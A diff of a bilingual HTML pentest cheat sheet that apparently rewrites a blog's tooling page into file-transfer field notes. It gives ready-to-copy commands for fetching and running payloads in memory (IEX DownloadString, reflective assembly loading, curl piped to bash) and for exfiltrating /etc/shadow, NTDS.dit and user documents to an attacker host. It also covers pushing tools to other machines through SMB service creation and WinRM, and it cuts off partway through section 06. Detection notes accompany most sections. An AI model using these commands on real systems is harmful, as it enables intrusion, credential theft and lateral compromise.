@@ -1,10 +1,14 @@
 <!doctype html>
+<!-- ============================================================
+     新しいチートシートを作るときはこのファイルを複製して編集する。
+     置換箇所: <TITLE> / <SLUG> / <目次> / <本文>
+     ============================================================ -->
 <html lang="ja">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Tooling — d0me</title>
-<meta name="description" content="道具立ての索引。環境・起動テンプレート・再利用スニペット・公開前サニタイズとコミット衛生。">
+<title>File Transfer &amp; Tooling — d0me</title>
+<meta name="description" content="File transfer field notes — payload delivery, loot exfiltration, lateral propagation, AV-evasion transfers, proxy egress, and verification.">
 <link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -13,118 +17,684 @@
 </head>
 <body>
 
-<header class="topbar"><div class="wrap">
-  <div class="brand"><span class="glyph">[<b data-handle>d0me</b>]</span><span class="tag">索引</span></div>
-  <button class="nav-toggle" aria-label="メニュー">≡</button>
-  <nav class="nav"><a href="../all.html">索引</a><a href="../index.html#certs">資格</a><a href="#" data-gh-url>github</a></nav>
-</div></header>
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand"><span class="glyph">[<b data-handle>d0me</b>]</span><span class="tag">索引</span></div>
+    <button class="nav-toggle" aria-label="メニュー">≡</button>
+    <nav class="nav"><a href="../all.html">索引</a><a href="../index.html#certs">資格</a><a href="#" data-gh-url>github</a></nav>
+  </div>
+</header>
 
 <main>
-<section class="sheet-hero"><div class="wrap">
-  <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>Tooling</div>
-  <h1>Tooling</h1>
-  <p class="lede">よく使う道具の起動テンプレートと、再利用しやすいスニペット。加えて、公開ノートへ落とす前のサニタイズとコミット衛生を定型化する。パスは環境変数・プレースホルダで一般化する。
-    <span class="jp">前提: Kali 系。<code>$TOOLS</code> は各自のツール置き場、impacket は venv 優先。</span></p>
-</div></section>
+<section class="sheet-hero">
+  <div class="wrap">
+    <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>File Transfer &amp; Tooling</div>
+    <h1>File Transfer &amp; Tooling</h1>
+    <p class="lede">Payload delivery, loot exfiltration, lateral propagation, and AV-evasion transfers — indexed by OS, direction, and egress constraint.<span class="jp">ペイロード配布・戦利品回収・横展開伝播・AV 回避転送をOS・方向・出口制約で索引化した実行順序ノート。</span></p>
+  </div>
+</section>
 
-<div class="wrap"><div class="sheet-layout">
+<div class="wrap">
+<div class="sheet-layout">
   <aside class="toc">
     <div class="toc-label">目次</div>
     <ul>
-      <li><a href="#env">01 環境 / environment</a></li>
-      <li><a href="#launch">02 起動テンプレート</a></li>
-      <li><a href="#snip">03 スニペット</a></li>
-      <li><a href="#sanitize">04 サニタイズ / commit</a></li>
-      <li><a href="#ref">05 参照</a></li>
+      <li><a href="#s01">01 Direction &amp; Selection</a></li>
+      <li><a href="#s02">02 Kali → Windows</a></li>
+      <li><a href="#s03">03 Windows → Kali</a></li>
+      <li><a href="#s04">04 Kali → Linux</a></li>
+      <li><a href="#s05">05 Linux → Kali</a></li>
+      <li><a href="#s06">06 Target → Target</a></li>
+      <li><a href="#s07">07 Proxy &amp; Restricted Egress</a></li>
+      <li><a href="#s08">08 AV/EDR Evasion Transfers</a></li>
+      <li><a href="#s09">09 Verification &amp; Debug</a></li>
+      <li><a href="#s10">10 Decision Chart &amp; Takeaways</a></li>
     </ul>
   </aside>
 
   <article class="doc">
-    <section id="env" class="reveal">
-      <h2><span class="num">01</span>環境<span class="jp">environment</span></h2>
-      <p>再現性のため、道具は固定パスに集約し、Python 系は venv に隔離する。impacket は system と venv で版が割れやすいので、<strong>venv の実体を優先</strong>してパスを固定する。</p>
-      <div class="code"><div class="code-bar"><span class="code-lang">zsh</span><button class="copy">copy</button></div><pre><code><span class="c"># 置き場と venv（例）</span>
-export TOOLS="$HOME/Tool"
-source ~/venvs/impacket/bin/activate
 
-<span class="c"># impacket は venv の実体を直呼び（版ズレ回避）</span>
-alias secretsdump='~/venvs/impacket/bin/secretsdump.py'
-alias getst='~/venvs/impacket/bin/getST.py'</code></pre></div>
-      <div class="note"><span class="lbl">tips</span>system と venv で挙動が違うときは <code>which -a secretsdump.py</code> で実体を確認し、フルパスで固定する。</div>
+    <section id="s01" class="reveal">
+      <h2><span class="num">01</span>Direction &amp; Selection<span class="jp">転送方向と選定基準</span></h2>
+
+      <h3>転送方向</h3>
+      <table>
+        <thead><tr><th>方向</th><th>主な用途</th></tr></thead>
+        <tbody>
+          <tr><td>[A] Kali → Target</td><td>ペイロード / ツール配布</td></tr>
+          <tr><td>[B] Target → Kali</td><td>戦利品 (proof / NTDS / hash) 回収</td></tr>
+          <tr><td>[C] Target ↔ Target</td><td>横展開時のツール伝播</td></tr>
+        </tbody>
+      </table>
+
+      <h3>選定基準マトリクス</h3>
+      <table>
+        <thead><tr><th>条件</th><th>推奨手法</th></tr></thead>
+        <tbody>
+          <tr><td>Windows / egress 自由</td><td>PowerShell IWR (Section 02-1)</td></tr>
+          <tr><td>Windows / AV 有効</td><td>Base64-over-HTTP → in-memory (Section 02-7, 08)</td></tr>
+          <tr><td>Windows / HTTP 遮断</td><td>SMB (Section 02-5) / Base64 コピペ (Section 02-6)</td></tr>
+          <tr><td>Linux / egress 自由</td><td>wget / curl (Section 04-1)</td></tr>
+          <tr><td>Linux / HTTP 遮断</td><td>SCP (Section 04-2) / Base64 (Section 04-3)</td></tr>
+          <tr><td>プロキシ必須</td><td>SOCKS proxychains (Section 07-1)</td></tr>
+          <tr><td>egress 全遮断</td><td>DNS tunnel (Section 07-3)</td></tr>
+          <tr><td>ファイルサイズ &gt; 10 MB</td><td>SMB / FTP / netcat (Section 02-5, 04-4)</td></tr>
+          <tr><td>ディスク書込禁止</td><td>in-memory / Meterpreter -m (Section 02-10, 08-3)</td></tr>
+          <tr><td>横展開時</td><td>WinRM Copy-Item / SMB sc (Section 06)</td></tr>
+        </tbody>
+      </table>
+
+      <h3>HTTP サーバ (Kali 側共通)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Python 3 (最速)</span>
+python3 -m http.server 8080
+
+<span class="c"># IPv4 / IPv6 両対応</span>
+python3 -c "
+import http.server, socketserver
+socketserver.TCPServer(('', 8080), http.server.SimpleHTTPRequestHandler).serve_forever()"
+
+<span class="c"># HTTPS (自己署名)</span>
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost'
+python3 -c "
+import ssl, http.server, socketserver
+httpd = socketserver.TCPServer(('', 443), http.server.SimpleHTTPRequestHandler)
+httpd.socket = ssl.wrap_socket(httpd.socket, keyfile='key.pem', certfile='cert.pem')
+httpd.serve_forever()"</code></pre></div>
     </section>
 
-    <section id="launch" class="reveal">
-      <h2><span class="num">02</span>起動テンプレート<span class="jp">launch</span></h2>
-      <p>頻用ツールの最短起動形。値はすべてプレースホルダ。</p>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 資格情報の面を測る</span>
-nxc smb <span class="v">&lt;TARGETS&gt;</span> -u '<span class="v">&lt;USER&gt;</span>' -p '<span class="v">&lt;PASS&gt;</span>'
+    <section id="s02" class="reveal">
+      <h2><span class="num">02</span>Kali → Windows<span class="jp">Windows へのツール配布</span></h2>
 
-<span class="c"># ファイル配布用の一時 HTTP</span>
-python3 -m http.server 8000
+      <h3>02-1. PowerShell IEX / IWR (推奨・最頻出)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># スクリプトをメモリで直接実行 (ディスク書込なし)</span>
+IEX(New-Object Net.WebClient).DownloadString('http://<span class="v">&lt;LHOST&gt;</span>:8080/payload.ps1')
 
-<span class="c"># ligolo-ng（攻撃側 proxy）</span>
-sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up
-$TOOLS/ligolo/proxy -selfcert
+<span class="c"># 短縮形</span>
+iex(iwr -UseBasicParsing http://<span class="v">&lt;LHOST&gt;</span>:8080/payload.ps1)
 
-<span class="c"># chisel（reverse socks）</span>
-$TOOLS/chisel server -p 8080 --reverse</code></pre></div>
-      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+<span class="c"># PSv2 互換 (旧 Windows)</span>
+$wc = New-Object System.Net.WebClient
+IEX $wc.DownloadString("http://<span class="v">&lt;LHOST&gt;</span>:8080/payload.ps1")</code></pre></div>
+      <div class="note warn"><span class="lbl">Note</span>AMSI 有効時は検知される。事前に AMSI bypass 必須 (<a href="evasion.html#s04">evasion 04</a>)。</div>
+
+      <h3>02-2. PowerShell DownloadFile (バイナリ転送)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># ディスクに保存</span>
+Invoke-WebRequest -Uri "http://<span class="v">&lt;LHOST&gt;</span>:8080/tool.exe" -OutFile "C:\Windows\Tasks\tool.exe"
+
+<span class="c"># 短縮形</span>
+iwr http://<span class="v">&lt;LHOST&gt;</span>:8080/tool.exe -O C:\Windows\Tasks\tool.exe
+
+<span class="c"># WebClient (高速 / 確実)</span>
+(New-Object Net.WebClient).DownloadFile("http://<span class="v">&lt;LHOST&gt;</span>:8080/tool.exe", "C:\Windows\Tasks\tool.exe")</code></pre></div>
+
+      <h3>02-3. certutil</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>certutil.exe -urlcache -split -f http://<span class="v">&lt;LHOST&gt;</span>:8080/tool.exe C:\Windows\Tasks\tool.exe</code></pre></div>
+      <div class="note warn"><span class="lbl">Note</span>Defender 監視中、最近のバージョンでは検知対象。AV 無効化後 (evasion 06) に使用を推奨。</div>
+
+      <h3>02-4. bitsadmin (古典的・信頼性高)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>bitsadmin /transfer job /download /priority normal ^
+    http://<span class="v">&lt;LHOST&gt;</span>:8080/tool.exe ^
+    C:\Windows\Tasks\tool.exe</code></pre></div>
+
+      <h3>02-5. SMB 共有 (impacket smbserver)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Kali: 匿名 SMB サーバ</span>
+smbserver.py share . -smb2support
+
+<span class="c"># Kali: 認証付き</span>
+smbserver.py share . -smb2support -username user -password '<span class="v">&lt;PASSWORD&gt;</span>'
+
+<span class="c"># smbd と競合する場合</span>
+sudo systemctl stop smbd</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code><span class="c">:: 匿名アクセス</span>
+dir \\<span class="v">&lt;LHOST&gt;</span>\share\
+copy \\<span class="v">&lt;LHOST&gt;</span>\share\tool.exe C:\Windows\Tasks\
+
+<span class="c">:: 認証付き</span>
+net use Z: \\<span class="v">&lt;LHOST&gt;</span>\share /user:user <span class="v">&lt;PASSWORD&gt;</span>
+copy Z:\tool.exe C:\Windows\Tasks\
+net use Z: /delete</code></pre></div>
+
+      <h3>02-6. Base64 (HTTP 不可・コピペ経由)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Kali: エンコード</span>
+base64 -w0 tool.exe > tool.b64
+cat tool.b64   <span class="c"># 出力をコピー</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Windows: 復元</span>
+$b64 = "TVqQAAMAAAAEAAAA..."  <span class="c"># 貼り付け</span>
+[IO.File]::WriteAllBytes("C:\Windows\Tasks\tool.exe", [Convert]::FromBase64String($b64))</code></pre></div>
+      <div class="note"><span class="lbl">Note</span>1 MB 超のファイルは分割が必要 (Section 08-1)。Meterpreter shell 経由コピペでも使用可。</div>
+
+      <h3>02-7. Base64-over-HTTP (PE シグネチャ隠蔽)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Kali: b64 ファイルを HTTP で提供</span>
+base64 -w0 tool.exe > tool.b64
+python3 -m http.server 80</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Windows: テキストとして取得 → メモリで復元</span>
+$b64 = (New-Object Net.WebClient).DownloadString("http://<span class="v">&lt;LHOST&gt;</span>/tool.b64")
+[IO.File]::WriteAllBytes("C:\Windows\Tasks\tool.exe", [Convert]::FromBase64String($b64))
+
+<span class="c"># ディスクに書かずアセンブリとしてロード (リフレクション)</span>
+$b64   = (iwr http://<span class="v">&lt;LHOST&gt;</span>/payload.b64 -UseBasicParsing).Content
+$bytes = [Convert]::FromBase64String($b64)
+$asm   = [System.Reflection.Assembly]::Load($bytes)
+$asm.EntryPoint.Invoke($null, $null)</code></pre></div>
+
+      <h3>02-8. Meterpreter upload</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>meterpreter &gt; cd C:\\Windows\\Tasks
+meterpreter &gt; upload tool.exe</code></pre></div>
+
+      <h3>02-9. FTP (pyftpdlib)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>python3 -m pyftpdlib -p 21 -u user -P '<span class="v">&lt;PASSWORD&gt;</span>' --write</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code><span class="c">:: バッチ経由 (非インタラクティブ)</span>
+echo open <span class="v">&lt;LHOST&gt;</span> 21  &gt; ftp_cmds.txt
+echo user           &gt;&gt; ftp_cmds.txt
+echo <span class="v">&lt;PASSWORD&gt;</span>       &gt;&gt; ftp_cmds.txt
+echo binary         &gt;&gt; ftp_cmds.txt
+echo get tool.exe   &gt;&gt; ftp_cmds.txt
+echo bye            &gt;&gt; ftp_cmds.txt
+ftp -s:ftp_cmds.txt</code></pre></div>
+
+      <h3>02-10. Meterpreter execute -m (完全 in-memory)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># -H: 非表示 / -m: メモリから実行 / -d: ダミープロセス名</span>
+meterpreter &gt; execute -H -m -d calc.exe -f tool.exe -a "-i -c cmd"</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
         <ul>
-          <li>これらは検証側の起動形。防御視点では、一時 HTTP 配布や reverse socks の外向き接続を egress で検知する。</li>
+          <li>IWR / DownloadString: PowerShell/Operational EID 4104 で URL とスクリプト本文が記録される</li>
+          <li>certutil: Defender のファイルダウンロード監視対象、Sysmon EID 1 で <code>certutil.exe -urlcache</code> の引数が露出</li>
+          <li>bitsadmin: BITS イベントログ (EID 59/60/61) で転送 URL が記録</li>
+          <li>SMB: EID 5140 (ネットワーク共有アクセス) / EID 5145 (共有オブジェクトアクセス)</li>
+          <li>Base64-over-HTTP: PE ヘッダの直接転送より検知率は低いが、<code>[System.Reflection.Assembly]::Load</code> は CLR ETW で観測可能</li>
         </ul>
       </div>
     </section>
 
-    <section id="snip" class="reveal">
-      <h2><span class="num">03</span>スニペット<span class="jp">snippets</span></h2>
-      <h3>LHOST を動的取得(tun0)</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>export LHOST=$(ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
-echo "$LHOST"</code></pre></div>
-      <h3>待受</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># TTY を含むリスナ運用は必要に応じて stty raw -echo で調整</span>
-rlwrap nc -lvnp 443</code></pre></div>
-      <div class="note"><span class="lbl">tips</span>ワンライナは環境変数(<code>$LHOST</code> 等)で持ち、値の直書きを避ける。公開ノートに実値を残さない習慣づけになる。</div>
+    <section id="s03" class="reveal">
+      <h2><span class="num">03</span>Windows → Kali<span class="jp">戦利品回収</span></h2>
+
+      <h3>03-1. PowerShell POST</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Kali: POST 受信サーバ</span>
+python3 -c "
+import http.server, socketserver
+class H(http.server.SimpleHTTPRequestHandler):
+    def do_POST(self):
+        n = int(self.headers['Content-Length'])
+        data = self.rfile.read(n)
+        open('/tmp/recv_' + self.path.strip('/'), 'wb').write(data)
+        self.send_response(200); self.end_headers()
+socketserver.TCPServer(('', 8080), H).serve_forever()"</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Windows: ファイル送信</span>
+$bytes = [IO.File]::ReadAllBytes("C:\Loot\proof.txt")
+Invoke-WebRequest -Uri "http://<span class="v">&lt;LHOST&gt;</span>:8080/proof.txt" -Method POST -Body $bytes
+
+<span class="c"># テキストファイル (文字列として送信)</span>
+$data = Get-Content "C:\Loot\proof.txt" -Raw
+Invoke-RestMethod -Uri "http://<span class="v">&lt;LHOST&gt;</span>:8080/proof.txt" -Method POST -Body $data</code></pre></div>
+
+      <h3>03-2. SMB (impacket smbserver で受信)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>mkdir -p /tmp/loot
+cd /tmp/loot
+smbserver.py share . -smb2support</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>copy C:\Loot\proof.txt \\<span class="v">&lt;LHOST&gt;</span>\share\
+
+<span class="c">:: 大量ファイル</span>
+robocopy C:\Loot \\<span class="v">&lt;LHOST&gt;</span>\share\ /S</code></pre></div>
+
+      <h3>03-3. Base64 コピペ</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Windows: エンコード → コピー</span>
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Loot\NTDS.dit"))</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Kali: 復元</span>
+echo "TVqQAAMAAAA..." | base64 -d &gt; /tmp/ntds.dit</code></pre></div>
+
+      <h3>03-4. Meterpreter download</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>meterpreter &gt; download C:\\Loot\\proof.txt /tmp/proof.txt
+
+<span class="c"># ディレクトリ全体</span>
+meterpreter &gt; download -r C:\\Users\\Administrator\\Documents\\</code></pre></div>
+
+      <h3>03-5. Compress-Archive + POST (大量ファイル)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>Compress-Archive -Path C:\Users\*\Documents -DestinationPath C:\Windows\Tasks\loot.zip
+$bytes = [IO.File]::ReadAllBytes("C:\Windows\Tasks\loot.zip")
+Invoke-WebRequest -Uri "http://<span class="v">&lt;LHOST&gt;</span>:8080/loot.zip" -Method POST -Body $bytes</code></pre></div>
+
+      <h3>03-6. Nishang Send-File</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>IEX(IWR http://<span class="v">&lt;LHOST&gt;</span>:8080/Send-File.ps1)
+Send-File -FilePath "C:\Loot\NTDS.dit" -Url "http://<span class="v">&lt;LHOST&gt;</span>:8080/upload"</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>POST による外部送信: NGFW の DLP ポリシーで大容量 POST (とくに zip / binary MIME) を検知</li>
+          <li>SMB 書込: EID 5145 で共有への write アクセスを監視</li>
+          <li><code>robocopy</code> の外部 UNC パス: 業務では稀、Sysmon EID 1 で引数露出</li>
+          <li>Meterpreter download: 既存 C2 セッションのトラフィックとして流れるが、HTTPS C2 であっても JA3 フィンガープリントで検出可能</li>
+          <li>Compress-Archive + POST: <code>Compress-Archive</code> の直後に <code>Invoke-WebRequest POST</code> という連鎖パターンは SIEM で有意</li>
+        </ul>
+      </div>
     </section>
 
-    <section id="sanitize" class="reveal">
-      <h2><span class="num">04</span>サニタイズ / コミット衛生<span class="jp">publish pipeline</span></h2>
-      <p>private vault → 検証再現 → <strong>サニタイズ</strong> → 公開、の一方向を守る。公開前に実値(IP・FQDN・ハッシュ・パス・利用者名)を機械的に当て、コミットは著者情報とタイムゾーンを固定する。</p>
-      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 公開前サニタイズ検査</span>
-grep -rInE '([0-9]{1,3}\.){3}[0-9]{1,3}|@gmail\.com|C:\\Users\\[A-Za-z0-9._-]+|/home/[a-z]+/[A-Za-z0-9._-]+' . \
-  --include='*.html' --include='*.md' --include='*.js'
+    <section id="s04" class="reveal">
+      <h2><span class="num">04</span>Kali → Linux<span class="jp">Linux へのツール配布</span></h2>
 
-<span class="c"># コミット衛生（著者=noreply, TZ=UTC）</span>
-git config user.email '<span class="v">&lt;ID&gt;</span>+<span class="v">&lt;HANDLE&gt;</span>@users.noreply.github.com'
-export TZ=UTC
-git log -3 --format='%an &lt;%ae&gt; | %ai'   <span class="c"># 全行 noreply / +0000 を確認</span></code></pre></div>
-      <div class="note warn"><span class="lbl">重要</span>denylist(実識別子の列挙)は公開リポジトリに絶対に含めない。それ自体が deanonymization 材料になる。</div>
+      <h3>04-1. wget / curl (最頻出)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># wget</span>
+wget http://<span class="v">&lt;LHOST&gt;</span>:8080/tool -O /tmp/tool
+chmod +x /tmp/tool
+
+<span class="c"># curl</span>
+curl http://<span class="v">&lt;LHOST&gt;</span>:8080/tool -o /tmp/tool
+chmod +x /tmp/tool
+
+<span class="c"># ディスクに書かず即実行</span>
+curl http://<span class="v">&lt;LHOST&gt;</span>:8080/tool.sh | bash</code></pre></div>
+
+      <h3>04-2. SCP (SSH 経由)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Kali → Target (Target 側で SSH 稼働)</span>
+scp tool user@<span class="v">&lt;TARGET&gt;</span>:/tmp/
+
+<span class="c"># 秘密鍵指定</span>
+scp -i id_rsa tool user@<span class="v">&lt;TARGET&gt;</span>:/tmp/</code></pre></div>
+
+      <h3>04-3. Base64 (HTTP 不可)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Kali: エンコード</span>
+base64 -w0 tool &gt; tool.b64
+cat tool.b64   <span class="c"># コピー</span>
+
+<span class="c"># Target: 復元</span>
+echo "IyEvYmluL..." | base64 -d &gt; /tmp/tool
+chmod +x /tmp/tool</code></pre></div>
+
+      <h3>04-4. dd over SSH (raw / 大容量)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>dd if=tool | ssh user@<span class="v">&lt;TARGET&gt;</span> "dd of=/tmp/tool"</code></pre></div>
+
+      <h3>04-5. netcat</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Kali (送信側)</span>
+nc -w3 <span class="v">&lt;TARGET&gt;</span> 9999 &lt; tool
+
+<span class="c"># Target (受信側、先に起動)</span>
+nc -lvnp 9999 &gt; /tmp/tool</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>wget / curl: プロセスの親子関係 (shell → wget の連鎖) と外部 IP を auditd / Sysmon for Linux で記録</li>
+          <li>SCP: SSH ログ (/var/log/auth.log) に接続元 IP とユーザ名が残る</li>
+          <li>netcat: 非標準ポートへの接続は NIDS で flagged、<code>-e</code> オプションは殆どのディストリで無効化済み</li>
+          <li><code>curl | bash</code>: 接続先 URL + ダウンロード内容がプロセス引数に残らないが、ネットワーク側では URL が平文露出 (HTTP の場合)</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s05" class="reveal">
+      <h2><span class="num">05</span>Linux → Kali<span class="jp">Linux からの戦利品回収</span></h2>
+
+      <h3>05-1. netcat (最速)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Kali (受信、先に起動)</span>
+nc -lvnp 9999 &gt; /tmp/loot.tar.gz
+
+<span class="c"># Target (送信)</span>
+tar czf - /etc/shadow /etc/passwd | nc <span class="v">&lt;LHOST&gt;</span> 9999</code></pre></div>
+
+      <h3>05-2. SCP</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Target から Kali へ (Target で SSH クライアント使用)</span>
+scp /etc/shadow user@<span class="v">&lt;LHOST&gt;</span>:/tmp/
+
+<span class="c"># Kali から Target 上のファイルを pull (Kali で実行)</span>
+scp -i id_rsa user@<span class="v">&lt;TARGET&gt;</span>:/etc/shadow /tmp/shadow</code></pre></div>
+
+      <h3>05-3. curl POST</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Target: アップロード</span>
+curl -X POST http://<span class="v">&lt;LHOST&gt;</span>:8080/shadow -d @/etc/shadow
+
+<span class="c"># バイナリ (--data-binary)</span>
+curl -X POST http://<span class="v">&lt;LHOST&gt;</span>:8080/file --data-binary @/path/to/file</code></pre></div>
+
+      <h3>05-4. Base64 コピペ</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Target: エンコード</span>
+base64 -w0 /etc/shadow
+
+<span class="c"># Kali: 復元</span>
+echo "cm9vdDo..." | base64 -d &gt; /tmp/shadow</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>netcat での外部送信: 非標準ポートへの outbound TCP が FW / NIDS でフラグ</li>
+          <li>curl POST: DLP で POST body のバイナリ / 大容量コンテンツを検知</li>
+          <li>/etc/shadow の直接 read は auditd (rule: -w /etc/shadow -p r) で確実に記録</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s06" class="reveal">
+      <h2><span class="num">06</span>Target → Target<span class="jp">横展開時の伝播</span></h2>
+      <p>横展開時の pivoting 構成 (chisel / ligolo-ng の tunnel 設定) は <a href="lateral-movement.html">lateral-movement sheet</a> を参照。ここではツール伝播の手段のみ扱う。</p>
+
+      <h3>06-1. SMB + sc (Windows A → Windows B)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>net use \\<span class="v">&lt;TARGET_B&gt;</span>\C$ /u:contoso.local\administrator <span class="v">&lt;PASSWORD&gt;</span>
+copy tool.exe \\<span class="v">&lt;TARGET_B&gt;</span>\C$\Windows\Tasks\
+sc \\<span class="v">&lt;TARGET_B&gt;</span> create mytool binpath= "C:\Windows\Tasks\tool.exe"
+sc \\<span class="v">&lt;TARGET_B&gt;</span> start mytool</code></pre></div>
+
+      <h3>06-2. WinRM Copy-Item (Windows A → Windows B)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>$cred    = New-Object PSCredential("contoso.local\administrator", (ConvertTo-SecureString '<span class="v">&lt;PASSWORD&gt;</span>' -AsPlainText -Force))
+$session = New-PSSession -ComputerName <span class="v">&lt;TARGET_B&gt;</span> -Credential $cred
+Copy-Item -ToSession $session -Path "tool.exe" -Destination "C:\Windows\Tasks\"
+Invoke-Command -Session $session -ScriptBlock { Start-Process "C:\Windows\Tasks\tool.exe" }</code></pre></div>
+
+      <h3>06-3. SCP (Linux A → Linux B)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>scp tool user@<span class="v">&lt;TARGET_B&gt;</span>:/tmp/
+ssh user@<span class="v">&lt;TARGET_B&gt;</span> "chmod +x /tmp/tool &amp;&amp; /tmp/tool &amp;"</code></pre></div>
+
+      <h3>06-4. PowerShell HTTP Relay (Windows A が配布元)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Windows A: 簡易 HTTP サーバ</span>
+$listener = [System.Net.HttpListener]::new()
+$listener.Prefixes.Add("http://+:8080/")
+$listener.Start()
+while ($listener.IsListening) {
+    $ctx  = $listener.GetContext()
+    $file = "C:\Windows\Tasks\" + $ctx.Request.RawUrl.TrimStart('/')
+    if (Test-Path $file) {
+        $data = [IO.File]::ReadAllBytes($file)
+        $ctx.Response.ContentLength64 = $data.Length
+        $ctx.Response.OutputStream.Write($data, 0, $data.Length)
+    }
+    $ctx.Response.Close()
+}
+
+<span class="c"># Windows B: A からダウンロード</span>
+iwr "http://<span class="v">&lt;TARGET_A&gt;</span>:8080/tool.exe" -OutFile "C:\Windows\Tasks\tool.exe"</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>SMB + sc: <code>net use</code> の UNC 接続 (EID 5140) + <code>sc create</code> によるサービス登録 (EID 7045) の連鎖</li>
